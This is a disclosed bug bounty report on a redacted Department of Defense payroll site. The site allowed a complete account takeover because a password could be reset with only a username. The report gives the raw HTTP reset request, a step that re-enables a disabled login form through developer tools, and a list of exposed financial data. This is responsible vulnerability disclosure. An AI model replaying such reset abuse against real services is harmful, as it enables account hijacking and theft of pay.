# ████ - Complete account takeover

## Report Details
- **Report ID**: 566811
- **URL**: https://hackerone.com/reports/566811
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-05-04T23:06:13.482Z
- **Disclosed**: 2020-05-11T16:49:56.744Z

## Reporter
- **Username**: cablej_dds
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**

███████ ██████████ was updated today (03/04), which includes a backend rewrite. Unfortunately, the new site is insecure and allows a password to be reset given only a username. This allows access to payment records for any DoD employee given only their username, which is commonly known. Further, ███ is used to authenticate to other sites such as ██████. Thus, this allows access to the complete ████████ record and other associated information (despite ████████ stating that ██████████ login is disabled, it still works).

## Impact

Trivial and complete compromise of any/all ████████ ███████ accounts, resulting in exposure and modification of sensitive financial records for all DoD civilian/military personnel. For instance, this exposes partial social security numbers, personal addresses, and pay history, and allows stealing funds by changing direct deposit information. Further, via associated sites (█████), this exposes the ██████ of all military service members.

## Step-by-step Reproduction Instructions

1. Visit https://████████/ and intercept a request to obtain valid cookies.
2. Make the following request, replacing the cookies with your new cookies if needed:

```
POST /api/session/personalsettings/ForgotPasswordChangeRequest HTTP/1.1
Host: ███
Connection: close
Content-Length: 151
Accept: application/json, text/plain, */*
Origin: https://█████████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Content-Type: application/json
Referer: https://████████/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: LastMRH_Session=█████; F5_ST=██████; MRHSession=████████████████████

{"Username":"x","Password":"y","IsLimitedAccessAccount":false,"HasNagC":false,"HasNagF":false,"HasNagM":false,"HasNagN":false}
```

3. Enter any user's username and a new password.
4. Submit the request. The user's password will be overwritten to the new password, and you may now log in.
5. Visit https://██████/milconnect/. Select to log in via █████. Despite the message saying it is disabled, edit the form via developer tools to enable both text boxes and the login button. Enter the user's credentials.
6. The login will be successful, allowing full access to the user's ███.

## Suggested Mitigation/Remediation Actions

Enforce social security number / security questions / email verification.

## Impact

.

## Attachments
No attachments
